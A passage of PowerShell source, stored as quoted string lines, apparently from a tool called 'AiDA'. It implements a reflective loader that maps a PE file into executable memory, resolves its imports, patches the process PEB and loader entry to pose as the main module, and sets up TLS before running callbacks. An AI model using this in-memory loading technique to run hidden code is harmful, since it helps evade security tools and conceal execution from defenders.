        'function Find-AidaStaticTlsIndex([uint32]$preferred,[object]$NtQueryInformationThread){$tid=0;if($script:AidaGetCurrentThreadId){$tid=$script:AidaGetCurrentThreadId.Invoke()};$info=Get-AidaStaticTlsInfo $tid ([IntPtr](-2)) $NtQueryInformationThread;$max=[uint32]128;$order=New-Object "System.Collections.Generic.List[uint32]";if($preferred -lt $max){[void]$order.Add($preferred)};for([uint32]$i=0;$i -lt $max;$i++){if($i -ne $preferred){[void]$order.Add($i)}};foreach($i in $order){$slot=[IntPtr]($info.vector+([int64]$i*8));try{$old=[Runtime.InteropServices.Marshal]::ReadInt64($slot)}catch{Write-AidaStatus ("[PE-DBG] step7c TLS static index read failed index={0} slot={1:X16} error={2}" -f $i,$slot.ToInt64(),$_.Exception.Message);continue};if($i -eq $preferred -and $old -ne 0){Write-AidaStatus ("[PE-DBG] step7c TLS preferred static slot occupied index={0} old={1:X16} poison={2}" -f $i,$old,(Test-AidaStaticTlsPoison $old))};if($old -eq 0){Write-AidaStatus ("[PE-DBG] step7c TLS selected static index={0} preferred_dynamic={1} teb={2:X16} vector={3:X16} slot={4:X16}" -f $i,$preferred,$info.teb,$info.vector,$slot.ToInt64());return [uint32]$i}};throw "AiDA: no empty static TLS vector slot found."}',
        'function Set-AidaStaticTlsForThread([uint32]$threadId,[IntPtr]$threadHandle,[uint32]$tlsIndex,[IntPtr]$tlsData,[object]$NtQueryInformationThread,[bool]$required){try{Write-AidaStatus ("[PE-DBG] step7c TLS static vector thread query enter tid={0} handle={1:X16} data={2:X16}" -f $threadId,$threadHandle.ToInt64(),$tlsData.ToInt64());$info=Get-AidaStaticTlsInfo $threadId $threadHandle $NtQueryInformationThread;$slot=[IntPtr]($info.vector+([int64]$tlsIndex*8));$old=[Runtime.InteropServices.Marshal]::ReadInt64($slot);Write-AidaStatus ("[PE-DBG] step7c TLS static vector thread before tid={0} teb={1:X16} vector={2:X16} slot_ptr={3:X16} old={4:X16} poison={5}" -f $threadId,$info.teb,$info.vector,$slot.ToInt64(),$old,(Test-AidaStaticTlsPoison $old));[Runtime.InteropServices.Marshal]::WriteInt64($slot,$tlsData.ToInt64());$new=[Runtime.InteropServices.Marshal]::ReadInt64($slot);Write-AidaStatus ("[PE-DBG] step7c TLS static vector thread after tid={0} slot_ptr={1:X16} value={2:X16}" -f $threadId,$slot.ToInt64(),$new);if($new -ne $tlsData.ToInt64()){$msg=("AiDA: TLS static vector write did not persist for tid={0}" -f $threadId);if($required){throw $msg};Write-AidaStatus ("[PE-DBG] step7c TLS static vector thread skip {0}" -f $msg);return $false};return $true}catch{if($required){throw};Write-AidaStatus ("[PE-DBG] step7c TLS static vector thread exception tid={0} error={1}" -f $threadId,$_.Exception.Message);return $false}}',
        'function Invoke-AidaPEInMemory([byte[]]$pe) {',
        '    $mods=(Get-Process -Id $PID).Modules',
        '    $k32=$mods|Where-Object{$_.ModuleName -ieq "kernel32.dll"}|Select-Object -First 1',
        '    $kb=$mods|Where-Object{$_.ModuleName -ieq "KernelBase.dll"}|Select-Object -First 1',
        '    $ntd=$mods|Where-Object{$_.ModuleName -ieq "ntdll.dll"}|Select-Object -First 1',
        '    $hK=$k32.BaseAddress; $hKB=if($kb){$kb.BaseAddress}else{[IntPtr]::Zero}; $hN=$ntd.BaseAddress',
        '    $pVA=Get-AidaWinApiProc $hK "VirtualAlloc"',
        '    $pLL=Get-AidaWinApiProc $hK "LoadLibraryA"',
        '    $pGP=Get-AidaWinApiProc $hK "GetProcAddress"',
        '    $pEP=Get-AidaWinApiProc $hK "ExitProcess"',
        '    $pRX=Get-AidaWinApiProc $hN "RtlExitUserProcess"',
        '    $pRC=Get-AidaWinApiProc $hN "RtlCopyMemory"',
        '    $pTA=Get-AidaWinApiProc $hK "TlsAlloc"',
        '    $pTS=Get-AidaWinApiProc $hK "TlsSetValue"',
        '    $pGL=Get-AidaWinApiProc $hK "GetLastError"',
        '    $pRA=Get-AidaWinApiProc $hN "RtlAllocateHeap"',
        '    $pRF=Get-AidaWinApiProc $hN "RtlFreeHeap"',
        '    $pNQ=Get-AidaWinApiProc $hN "NtQueryInformationProcess"',
        '    $pNQT=Get-AidaWinApiProc $hN "NtQueryInformationThread"',
        '    $pGCT=Get-AidaWinApiProc $hK "GetCurrentThreadId"',
        '    $pSV=Get-AidaWinApiProc $hK "SetProcessValidCallTargets"',
        '    if($pSV -eq [IntPtr]::Zero -and $hKB -ne [IntPtr]::Zero){$pSV=Get-AidaWinApiProc $hKB "SetProcessValidCallTargets"}',
        '    Write-AidaStatus ("[PE-DBG] step1 procs pK={0:X} pKB={1:X} pN={2:X} pVA={3:X} pEP={4:X} pRX={5:X} pTA={6:X} pTS={7:X} pGL={8:X} pNQ={9:X} pNQT={10:X} pSV={11:X}" -f $hK.ToInt64(),$hKB.ToInt64(),$hN.ToInt64(),$pVA.ToInt64(),$pEP.ToInt64(),$pRX.ToInt64(),$pTA.ToInt64(),$pTS.ToInt64(),$pGL.ToInt64(),$pNQ.ToInt64(),$pNQT.ToInt64(),$pSV.ToInt64())',
        '    Write-AidaStatus ("[PE-DBG] step1 thread procs pGCT={0:X} pRA={1:X} pRF={2:X}" -f $pGCT.ToInt64(),$pRA.ToInt64(),$pRF.ToInt64())',
        '    $dVA=New-AidaDelegateType @([IntPtr],[uint32],[uint32],[uint32]) ([IntPtr])',
        '    $dLL=New-AidaDelegateType @([string]) ([IntPtr])',
        '    $dGP=New-AidaDelegateType @([IntPtr],[string]) ([IntPtr])',
        '    $dGI=New-AidaDelegateType @([IntPtr],[IntPtr]) ([IntPtr])',
        '    $dRC=New-AidaDelegateType @([IntPtr],[IntPtr],[uint32]) ([void])',
        '    $dTA=New-AidaDelegateType ([Type[]]@()) ([uint32])',
        '    $dTS=New-AidaDelegateType @([uint32],[IntPtr]) ([bool])',
        '    $dGL=New-AidaDelegateType ([Type[]]@()) ([uint32])',
        '    $dNQ=New-AidaDelegateType @([IntPtr],[uint32],[IntPtr],[uint32],[uint32].MakeByRefType()) ([int])',
        '    $dNQT=New-AidaDelegateType @([IntPtr],[uint32],[IntPtr],[uint32],[uint32].MakeByRefType()) ([int])',
        '    $dGCT=New-AidaDelegateType ([Type[]]@()) ([uint32])',
        '    $dSV=New-AidaDelegateType @([IntPtr],[IntPtr],[UIntPtr],[uint32],[IntPtr]) ([bool])',
        '    $dRA=New-AidaDelegateType @([IntPtr],[uint32],[UIntPtr]) ([IntPtr])',
        '    $dRF=New-AidaDelegateType @([IntPtr],[uint32],[IntPtr]) ([bool])',
        '    $VirtualAlloc=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVA,$dVA)',
        '    $LoadLibraryA=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pLL,$dLL)',
        '    $GetProcAddr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pGP,$dGP)',
        '    $GetProcAddrInt=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pGP,$dGI)',
        '    $RtlCopyMemory=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pRC,$dRC)',
        '    $TlsAlloc=if($pTA-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pTA,$dTA)}else{$null}',
        '    $TlsSetValue=if($pTS-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pTS,$dTS)}else{$null}',
        '    $GetLastError=if($pGL-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pGL,$dGL)}else{$null}',
        '    $NtQueryInformationProcess=if($pNQ-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNQ,$dNQ)}else{$null}',
        '    $NtQueryInformationThread=if($pNQT-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNQT,$dNQT)}else{$null}',
        '    $GetCurrentThreadId=if($pGCT-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pGCT,$dGCT)}else{$null}',
        '    $RtlAllocateHeap=if($pRA-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pRA,$dRA)}else{$null}',
        '    $RtlFreeHeap=if($pRF-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pRF,$dRF)}else{$null}',
        '    $script:AidaGetCurrentThreadId=$GetCurrentThreadId',
        '    $SetProcessValidCallTargets=if($pSV-ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pSV,$dSV)}else{$null}',
        '    $MEM_COMMIT=0x1000; $MEM_RESERVE=0x2000; $PAGE_EXECUTE_READWRITE=0x40; $PAGE_READWRITE=0x04',
        '    Write-AidaStatus "[PE-DBG] step2 process-exit APIs left unmodified"',
        '    $lfanew=[int](Read-AidaU32 $pe 0x3C)',
        '    $optOff=$lfanew+24',
        '    $nSec=Read-AidaU16 $pe ($lfanew+6)',
        '    $optSz=Read-AidaU16 $pe ($lfanew+20)',
        '    $imgBase=Read-AidaU64 $pe ($optOff+24)',
        '    $epRVA=Read-AidaU32 $pe ($optOff+16)',
        '    $sizeOfImg=Read-AidaU32 $pe ($optOff+56)',
        '    $sizeOfHdrs=Read-AidaU32 $pe ($optOff+60)',
        '    $preferredBase=if($imgBase -ne 0){[IntPtr]([int64]$imgBase)}else{[IntPtr]::Zero}',
        '    $base=if($preferredBase -ne [IntPtr]::Zero){$VirtualAlloc.Invoke($preferredBase,$sizeOfImg,$MEM_COMMIT -bor $MEM_RESERVE,$PAGE_EXECUTE_READWRITE)}else{[IntPtr]::Zero}',
        '    $preferredAllocLastError=if($null -ne $GetLastError){$GetLastError.Invoke()}else{0}',
        '    if($base -eq [IntPtr]::Zero){Write-AidaStatus ("[PE-DBG] step3 preferred VirtualAlloc failed preferred={0:X16} sizeOfImg={1:X} gle={2}" -f $preferredBase.ToInt64(),$sizeOfImg,$preferredAllocLastError);$base=$VirtualAlloc.Invoke([IntPtr]::Zero,$sizeOfImg,$MEM_COMMIT -bor $MEM_RESERVE,$PAGE_EXECUTE_READWRITE)}',
        '    $fallbackAllocLastError=if($null -ne $GetLastError){$GetLastError.Invoke()}else{0}',
        '    Write-AidaStatus ("[PE-DBG] step3 VirtualAlloc base={0:X16} preferred={1:X16} sizeOfImg={2:X} nSec={3} epRVA={4:X} imgBase={5:X16} preferred_gle={6} fallback_gle={7}" -f $base.ToInt64(),$preferredBase.ToInt64(),$sizeOfImg,$nSec,$epRVA,$imgBase,$preferredAllocLastError,$fallbackAllocLastError)',
        '    if($base -eq [IntPtr]::Zero){throw "AiDA: memory allocation failed."}',
        '    $gh=[Runtime.InteropServices.GCHandle]::Alloc($pe,"Pinned")',
        '    $src=$gh.AddrOfPinnedObject()',
        '    $RtlCopyMemory.Invoke($base,$src,$sizeOfHdrs)',
        '    Write-AidaStatus "[PE-DBG] step4 headers copied"',
        '    $secOff=$lfanew+24+$optSz',
        '    for($i=0;$i -lt $nSec;$i++){',
        '        $e=$secOff+$i*40',
        '        $vA=Read-AidaU32 $pe ($e+12); $rSz=Read-AidaU32 $pe ($e+16); $rP=Read-AidaU32 $pe ($e+20)',
        '        if($rSz -gt 0){$RtlCopyMemory.Invoke([IntPtr]($base.ToInt64()+$vA),[IntPtr]($src.ToInt64()+$rP),$rSz)}',
        '    }',
        '    Write-AidaStatus "[PE-DBG] step5 sections mapped"',
        '    $delta=$base.ToInt64()-[int64]$imgBase',
        '    $relocApplied=0',
        '    if($delta -ne 0){',
        '        $rRVA=Read-AidaU32 $pe ($optOff+112+5*8); $rSz2=Read-AidaU32 $pe ($optOff+112+5*8+4)',
        '        Write-AidaStatus ("[PE-DBG] step6 relocation directory rva={0:X} size={1} delta={2:X16}" -f $rRVA,$rSz2,$delta)',
        '        if($rRVA -eq 0 -or $rSz2 -eq 0){throw ("AiDA: preferred image base unavailable and relocation directory is stripped. preferred={0:X16} actual={1:X16}" -f $imgBase,$base.ToInt64())}',
        '        $rPos=[int](AidaRvaToOff $rRVA $pe $lfanew $nSec $optSz)',
        '        $rEnd=$rPos+[int]$rSz2',
        '        while($rPos -lt $rEnd){',
        '            $pgRVA=Read-AidaU32 $pe $rPos; $blkSz=Read-AidaU32 $pe ($rPos+4)',
        '            if($blkSz -eq 0){break}',
        '            $ec=($blkSz-8)/2; $eB=$rPos+8',
        '            for($ri=0;$ri -lt $ec;$ri++){',
        '                $ent=Read-AidaU16 $pe ($eB+$ri*2); $t=$ent -shr 12; $off2=$ent -band 0x0FFF',
        '                if($t -eq 10){$pa=[IntPtr]($base.ToInt64()+$pgRVA+$off2);$orig=[Runtime.InteropServices.Marshal]::ReadInt64($pa);[Runtime.InteropServices.Marshal]::WriteInt64($pa,$orig+$delta);$relocApplied++}',
        '            }',
        '            $rPos+=[int]$blkSz',
        '        }',
        '    }',
        '    Write-AidaStatus ("[PE-DBG] step6 relocations applied delta={0:X16} count={1}" -f $delta,$relocApplied)',
        '    $impRVA=Read-AidaU32 $pe ($optOff+112+1*8)',
        '    if($impRVA -ne 0){',
        '        $impOff=[int](AidaRvaToOff $impRVA $pe $lfanew $nSec $optSz)',
        '        while($true){',
        '            $oft=Read-AidaU32 $pe $impOff; $nRVA=Read-AidaU32 $pe ($impOff+12); $ftRVA=Read-AidaU32 $pe ($impOff+16)',
        '            if($oft -eq 0 -and $nRVA -eq 0 -and $ftRVA -eq 0){break}',
        '            $nOff=[int](AidaRvaToOff $nRVA $pe $lfanew $nSec $optSz)',
        '            $dll=""; $j=0; while($pe[$nOff+$j] -ne 0){$dll+=[char]$pe[$nOff+$j];$j++}',
        '            $hMod=$LoadLibraryA.Invoke($dll)',
        '            Write-AidaStatus ("[PE-DBG] import dll={0} hMod={1:X16}" -f $dll,$hMod.ToInt64())',
        '            $ot=if($oft -ne 0){$oft}else{$ftRVA}',
        '            $otOff=[int](AidaRvaToOff $ot $pe $lfanew $nSec $optSz)',
        '            $ti=0',
        '            while($true){',
        '                $thunk=Read-AidaU64 $pe ($otOff+$ti*8)',
        '                if($thunk -eq 0){break}',
        '                $fa=[IntPtr]::Zero',
        '                if(($thunk -band 0x8000000000000000) -ne 0){$fa=$GetProcAddrInt.Invoke($hMod,[IntPtr]([int][uint16]($thunk -band 0xFFFF)))}',
        '                else{$hnOff=[int](AidaRvaToOff ([uint32]$thunk) $pe $lfanew $nSec $optSz);$fn="";$jj=2;while($pe[$hnOff+$jj] -ne 0){$fn+=[char]$pe[$hnOff+$jj];$jj++};$fa=$GetProcAddr.Invoke($hMod,$fn)}',
        '                if($fa -ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]($base.ToInt64()+$ftRVA+$ti*8),$fa.ToInt64())}',
        '                $ti++',
        '            }',
        '            $impOff+=20',
        '        }',
        '    }',
        '    Write-AidaStatus "[PE-DBG] step7 imports resolved"',
        '    Write-AidaStatus "[PE-DBG] step7b Z3 bootstrap preload skipped; native runtime extracts embedded protected resources after entry"',
        '    $pdataRVA=Read-AidaU32 $pe ($optOff+112+3*8); $pdataSize=Read-AidaU32 $pe ($optOff+112+3*8+4)',
        '    if($pdataRVA -ne 0 -and $pdataSize -gt 0){',
        '        $pRtlAFT=Get-AidaWinApiProc $hN "RtlAddFunctionTable"',
        '        if($pRtlAFT -ne [IntPtr]::Zero){',
        '            $dRtlAFT=New-AidaDelegateType @([IntPtr],[uint32],[uint64]) ([bool])',
        '            $RtlAddFT=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pRtlAFT,$dRtlAFT)',
        '            $ftCount=[uint32][Math]::Floor($pdataSize/12)',
        '            [void]$RtlAddFT.Invoke([IntPtr]($base.ToInt64()+$pdataRVA),$ftCount,[uint64]$base.ToInt64())',
        '            Write-AidaStatus ("[PE-DBG] step7a RtlAddFunctionTable entries={0}" -f $ftCount)',
        '        }',
        '    }',
        '    $lcRVA=Read-AidaU32 $pe ($optOff+112+10*8); $lcDirSz=Read-AidaU32 $pe ($optOff+112+10*8+4)',
        '    if($lcRVA -ne 0 -and $lcDirSz -gt 0){',
        '        $lcStructSz=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($base.ToInt64()+$lcRVA))',
        '        if($lcStructSz -ge 0x68){',
        '            $cookieVA=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($base.ToInt64()+$lcRVA+0x60))',
        '            if($cookieVA -ne 0){',
        '                $cookiePtr=Resolve-AidaMappedVa ([uint64]$cookieVA) $base ([uint64]$imgBase) $sizeOfImg',
        '                Write-AidaStatus ("[PE-DBG] step7b security_cookie raw_va={0:X16} resolved={1:X16}" -f $cookieVA,$cookiePtr.ToInt64())',
        '                if($cookiePtr -eq [IntPtr]::Zero){throw "AiDA: load-config security cookie pointer is outside mapped image."}',
        '                $rng2=[Security.Cryptography.RandomNumberGenerator]::Create(); $cb2=New-Object byte[] 8; try{$rng2.GetBytes($cb2)}finally{$rng2.Dispose()}',
        '                $cb2[7]=$cb2[7] -band 0x3F; if($cb2[7] -eq 0 -and $cb2[6] -eq 0){$cb2[6]=0x01}',
        '                [Runtime.InteropServices.Marshal]::WriteInt64($cookiePtr,[BitConverter]::ToInt64($cb2,0))',
        '                [Array]::Clear($cb2,0,$cb2.Length)',
        '            }',
        '        }',
        '    }',
        '    if($null -eq $NtQueryInformationProcess){throw "AiDA: NtQueryInformationProcess unavailable."}',
        '    $pbi=[Runtime.InteropServices.Marshal]::AllocHGlobal(48)',
        '    try{',
        '        [uint32]$pbiReturn=0',
        '        Write-AidaStatus "[PE-DBG] step7c0 PEB image base patch enter"',
        '        $ntStatus=$NtQueryInformationProcess.Invoke([IntPtr](-1),[uint32]0,$pbi,[uint32]48,[ref]$pbiReturn)',
        '        $pebPtr=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($pbi.ToInt64()+8))',
        '        if($ntStatus -ne 0 -or $pebPtr -eq 0){throw ("AiDA: NtQueryInformationProcess failed status=0x{0:X8} ret={1} peb={2:X16}" -f ([uint32]$ntStatus),$pbiReturn,$pebPtr)}',
        '        $processHeap=[IntPtr]([Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($pebPtr+0x30)))',
        '        $pebImageBasePtr=[IntPtr]($pebPtr+0x10)',
        '        $oldPebImageBase=[Runtime.InteropServices.Marshal]::ReadInt64($pebImageBasePtr)',
        '        Write-AidaStatus ("[PE-DBG] step7c0 PEB image base before peb={0:X16} heap={1:X16} slot={2:X16} value={3:X16} ret={4}" -f $pebPtr,$processHeap.ToInt64(),$pebImageBasePtr.ToInt64(),$oldPebImageBase,$pbiReturn)',
        '        $hostImageBaseForCfg=$oldPebImageBase',
        '        [Runtime.InteropServices.Marshal]::WriteInt64($pebImageBasePtr,$base.ToInt64())',
        '        $newPebImageBase=[Runtime.InteropServices.Marshal]::ReadInt64($pebImageBasePtr)',
        '        Write-AidaStatus ("[PE-DBG] step7c0 PEB image base after value={0:X16}" -f $newPebImageBase)',
        '        $ldrPtr=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($pebPtr+0x18))',
        '        if($ldrPtr -ne 0){',
        '            $ldrEntry=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($ldrPtr+0x10))',
        '            if($ldrEntry -ne 0 -and $ldrEntry -ne ($ldrPtr+0x10)){',
        '                $ldrDllBasePtr=[IntPtr]($ldrEntry+0x30); $ldrEntryPointPtr=[IntPtr]($ldrEntry+0x38); $ldrSizePtr=[IntPtr]($ldrEntry+0x40)',
        '                $ldrFullLen=[Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]($ldrEntry+0x48)); $ldrFullMax=[Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]($ldrEntry+0x4A)); $ldrFullBuf=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($ldrEntry+0x50))',
        '                $ldrBaseLen=[Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]($ldrEntry+0x58)); $ldrBaseMax=[Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]($ldrEntry+0x5A)); $ldrBaseBuf=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($ldrEntry+0x60))',
        '                $ldrOldBase=[Runtime.InteropServices.Marshal]::ReadInt64($ldrDllBasePtr); $ldrOldEntry=[Runtime.InteropServices.Marshal]::ReadInt64($ldrEntryPointPtr); $ldrOldSize=[Runtime.InteropServices.Marshal]::ReadInt32($ldrSizePtr)',
        '                Write-AidaStatus ("[PE-DBG] step7c1 LDR main before ldr={0:X16} entry={1:X16} dll_base={2:X16} entrypoint={3:X16} size={4:X} full_len={5}/{6} full_buf={7:X16} base_len={8}/{9} base_buf={10:X16}" -f $ldrPtr,$ldrEntry,$ldrOldBase,$ldrOldEntry,$ldrOldSize,$ldrFullLen,$ldrFullMax,$ldrFullBuf,$ldrBaseLen,$ldrBaseMax,$ldrBaseBuf)',
        '                [Runtime.InteropServices.Marshal]::WriteInt64($ldrDllBasePtr,$base.ToInt64())',
        '                [Runtime.InteropServices.Marshal]::WriteInt64($ldrEntryPointPtr,($base.ToInt64()+[int64]$epRVA))',
        '                [Runtime.InteropServices.Marshal]::WriteInt32($ldrSizePtr,[int]$sizeOfImg)',
        '                $ldrNewBase=[Runtime.InteropServices.Marshal]::ReadInt64($ldrDllBasePtr); $ldrNewEntry=[Runtime.InteropServices.Marshal]::ReadInt64($ldrEntryPointPtr); $ldrNewSize=[Runtime.InteropServices.Marshal]::ReadInt32($ldrSizePtr)',
        '                Write-AidaStatus ("[PE-DBG] step7c1 LDR main after dll_base={0:X16} entrypoint={1:X16} size={2:X}" -f $ldrNewBase,$ldrNewEntry,$ldrNewSize)',
        '            } else { Write-AidaStatus ("[PE-DBG] step7c1 LDR main entry unavailable ldr={0:X16} flink={1:X16}" -f $ldrPtr,$ldrEntry) }',
        '        } else { Write-AidaStatus "[PE-DBG] step7c1 LDR pointer unavailable" }',
        '    } finally { if($pbi -ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::FreeHGlobal($pbi)} }',
        '    $tlsRVA=Read-AidaU32 $pe ($optOff+112+9*8); $tlsSz=Read-AidaU32 $pe ($optOff+112+9*8+4)',
        '    if($tlsRVA -ne 0 -and $tlsSz -ge 40){',
        '        $tlsDir2=[IntPtr]($base.ToInt64()+$tlsRVA)',
        '        $tlsStartRaw=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($tlsDir2.ToInt64()+0))',
        '        $tlsEndRaw=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($tlsDir2.ToInt64()+8))',
        '        $addrIdx=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($tlsDir2.ToInt64()+16))',
        '        $addrCbs=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($tlsDir2.ToInt64()+24))',
        '        $tlsZeroFill=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($tlsDir2.ToInt64()+32))',
        '        $idxPtr=Resolve-AidaMappedVa ([uint64]$addrIdx) $base ([uint64]$imgBase) $sizeOfImg',
        '        $rawStartPtr=Resolve-AidaMappedVa ([uint64]$tlsStartRaw) $base ([uint64]$imgBase) $sizeOfImg',
        '        $cbArrayPtr=Resolve-AidaMappedVa ([uint64]$addrCbs) $base ([uint64]$imgBase) $sizeOfImg',
        '        $rawSize=[int64]([Math]::Max(0,$tlsEndRaw-$tlsStartRaw))',
        '        $tlsSize=[uint32][Math]::Max(1,$rawSize+[int64][Math]::Max(0,$tlsZeroFill))',
        '        Write-AidaStatus ("[PE-DBG] step7c TLS dir rva={0:X} size={1} idx_raw={2:X16} idx_ptr={3:X16} raw_start={4:X16} raw_end={5:X16} raw_ptr={6:X16} raw_size={7} zero_fill={8} tls_size={9} cb_raw={10:X16} cb_ptr={11:X16}" -f $tlsRVA,$tlsSz,$addrIdx,$idxPtr.ToInt64(),$tlsStartRaw,$tlsEndRaw,$rawStartPtr.ToInt64(),$rawSize,$tlsZeroFill,$tlsSize,$addrCbs,$cbArrayPtr.ToInt64())',
        '        if($addrIdx -ne 0 -and $idxPtr -eq [IntPtr]::Zero){throw "AiDA: TLS index pointer is outside mapped image."}',
        '        [uint32]$tlsIndex=0',
        '        if($addrIdx -ne 0){',
        '            if($null -eq $TlsAlloc -or $null -eq $TlsSetValue){throw "AiDA: TLS APIs unavailable."}',
        '            Write-AidaStatus "[PE-DBG] step7c TLS dynamic alloc enter"',
        '            $tlsDynamicIndex=$TlsAlloc.Invoke()',
        '            $tlsAllocLastError=if($null -ne $GetLastError){$GetLastError.Invoke()}else{0}',
        '            Write-AidaStatus ("[PE-DBG] step7c TLS dynamic alloc exit index={0} last_error={1}" -f $tlsDynamicIndex,$tlsAllocLastError)',
        '            if($tlsDynamicIndex -eq [uint32]::MaxValue){throw ("AiDA: TlsAlloc failed gle={0}" -f $tlsAllocLastError)}',
        '            $tlsIndex=Find-AidaStaticTlsIndex $tlsDynamicIndex $NtQueryInformationThread',
        '            Write-AidaStatus ("[PE-DBG] step7c TLS index selected static={0} dynamic={1}" -f $tlsIndex,$tlsDynamicIndex)',
        '            Write-AidaStatus ("[PE-DBG] step7c TLS write index enter ptr={0:X16} index={1}" -f $idxPtr.ToInt64(),$tlsIndex)',
        '            [Runtime.InteropServices.Marshal]::WriteInt32($idxPtr,[int]$tlsIndex)',
        '            Write-AidaStatus "[PE-DBG] step7c TLS write index exit"',
        '            if($rawSize -gt 0 -and $rawStartPtr -eq [IntPtr]::Zero){throw "AiDA: TLS raw data pointer is outside mapped image."}',
        '            if($null -eq $RtlAllocateHeap){throw "AiDA: RtlAllocateHeap unavailable for TLS data."}',
        '            if($processHeap -eq [IntPtr]::Zero){throw "AiDA: process heap unavailable for TLS data."}',
        '            $tlsAllocBytes=[uint64]$tlsSize+8',
        '            Write-AidaStatus ("[PE-DBG] step7c TLS heap alloc enter heap={0:X16} data_size={1} alloc_size={2}" -f $processHeap.ToInt64(),$tlsSize,$tlsAllocBytes)',
        '            $tlsRecord=$RtlAllocateHeap.Invoke($processHeap,[uint32]8,[UIntPtr]$tlsAllocBytes)',
        '            $tlsAllocDataLastError=if($null -ne $GetLastError){$GetLastError.Invoke()}else{0}',
        '            if($tlsRecord -eq [IntPtr]::Zero){throw ("AiDA: TLS heap allocation failed gle={0}" -f $tlsAllocDataLastError)}',
        '            [Runtime.InteropServices.Marshal]::WriteInt64($tlsRecord,$tlsRecord.ToInt64())',
        '            $tlsData=[IntPtr]($tlsRecord.ToInt64()+8)',
        '            Write-AidaStatus ("[PE-DBG] step7c TLS heap alloc exit record={0:X16} data={1:X16} last_error={2}" -f $tlsRecord.ToInt64(),$tlsData.ToInt64(),$tlsAllocDataLastError)',
        '            if($rawSize -gt 0){if($rawStartPtr -eq [IntPtr]::Zero){throw "AiDA: TLS raw data pointer is outside mapped image."};Write-AidaStatus ("[PE-DBG] step7c TLS raw copy enter src={0:X16} dst={1:X16} size={2}" -f $rawStartPtr.ToInt64(),$tlsData.ToInt64(),$rawSize);$RtlCopyMemory.Invoke($tlsData,$rawStartPtr,[uint32]$rawSize);Write-AidaStatus "[PE-DBG] step7c TLS raw copy exit"}',
        '            Write-AidaStatus ("[PE-DBG] step7c TLS dynamic set value enter index={0} data={1:X16}" -f $tlsDynamicIndex,$tlsData.ToInt64())',
        '            $tlsSetOk=$TlsSetValue.Invoke($tlsDynamicIndex,$tlsData)',
        '            $tlsSetLastError=if($null -ne $GetLastError){$GetLastError.Invoke()}else{0}',
            '            Write-AidaStatus ("[PE-DBG] step7c TLS dynamic set value exit ok={0} last_error={1}" -f $tlsSetOk,$tlsSetLastError)',
            '            if(-not $tlsSetOk){throw ("AiDA: TlsSetValue failed gle={0}" -f $tlsSetLastError)}',
            '            if($null -eq $NtQueryInformationThread){throw "AiDA: NtQueryInformationThread unavailable."}',
            '            $currentThreadId=if($null -ne $GetCurrentThreadId){$GetCurrentThreadId.Invoke()}else{0}',
            '            $tlsCurrentThreadInitialized=Set-AidaStaticTlsForThread $currentThreadId ([IntPtr](-2)) $tlsIndex $tlsData $NtQueryInformationThread $true',
            '            Write-AidaStatus ("[PE-DBG] step7c TLS current thread initialized={0} tid={1}" -f $tlsCurrentThreadInitialized,$currentThreadId)',
            '            Write-AidaStatus "[PE-DBG] step7c TLS existing thread propagation skipped; runtime worker TLS is handled in-process"',
            '            Write-AidaStatus ("[PE-DBG] step7c TLS slot initialized index={0} data={1:X16} size={2}" -f $tlsIndex,$tlsData.ToInt64(),$tlsSize)',
        '        }',
        '        if($addrCbs -ne 0){',
        '            if($cbArrayPtr -eq [IntPtr]::Zero){throw "AiDA: TLS callback array is outside mapped image."}',
        '            $cbI2=0',
        '            while($true){',
        '                $cbRaw=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($cbArrayPtr.ToInt64()+$cbI2*8))',
        '                if($cbRaw -eq 0){break}',
        '                $cbPtr=Resolve-AidaMappedVa ([uint64]$cbRaw) $base ([uint64]$imgBase) $sizeOfImg',
        '                Write-AidaStatus ("[PE-DBG] step7c TLS callback index={0} raw={1:X16} resolved={2:X16}" -f $cbI2,$cbRaw,$cbPtr.ToInt64())',
        '                if($cbPtr -eq [IntPtr]::Zero){throw "AiDA: TLS callback pointer is outside mapped image."}',
        '                $dTCb=New-AidaDelegateType @([IntPtr],[uint32],[IntPtr]) ([void])',
        '                $tCb=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cbPtr,$dTCb)',
        '                Write-AidaStatus ("[PE-DBG] step7c TLS callback invoke enter index={0} ptr={1:X16}" -f $cbI2,$cbPtr.ToInt64())',
